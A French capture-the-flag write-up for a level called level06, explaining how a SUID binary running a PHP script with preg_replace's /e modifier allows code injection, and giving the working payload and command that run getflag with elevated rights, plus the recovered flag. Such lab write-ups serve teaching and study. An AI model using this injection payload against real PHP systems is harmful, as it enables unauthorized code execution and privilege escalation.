# level06

## Contexte

On trouve deux fichiers dans le home de `level06` :

```text
level06
level06.php
```

Le fichier `level06` est un binaire SUID appartenant à `flag06`.

## Recherche

On regarde le contenu du script PHP :

```bash
cat level06.php

#!/usr/bin/php

<?php
function y($m) {
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}

function x($y, $z) {
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}

$r = x($argv[1], $argv[2]); print $r;

?>

```

On remarque qu'il récupère un fichier passé en argument et qu'il l'exécute avec la fonction `preg_replace()` et l'option `e`.

Cette option (maintenant dépréciée) permet d'exécuter le résultat du remplacement comme du code PHP.

## Vulnérabilité

La vulnérabilité vient de l'utilisation de `preg_replace` avec le modificateur `e`.

Cette option permet une **exécution de code PHP** si une partie de l'expression peut être contrôlée par l'utilisateur.

Comme le script est exécuté par le binaire SUID, le code injecté sera exécuté avec les droits de `flag06`.

## Exploitation

On crée un fichier PHP contenant une expression qui exécutera `getflag` :

```bash
echo '[x ${@eval($_GET[system($z)])}]' > /tmp/exploit
```

On lance ensuite le programme :

```bash
./level06 /tmp/exploit getflag
```

Le code PHP injecté est exécuté et récupère le flag :

```text
wiok45aaoguiboiki2tuin6ub
```

## Ressources

- PHP
- `preg_replace`
- regex
- SUID
- Code injection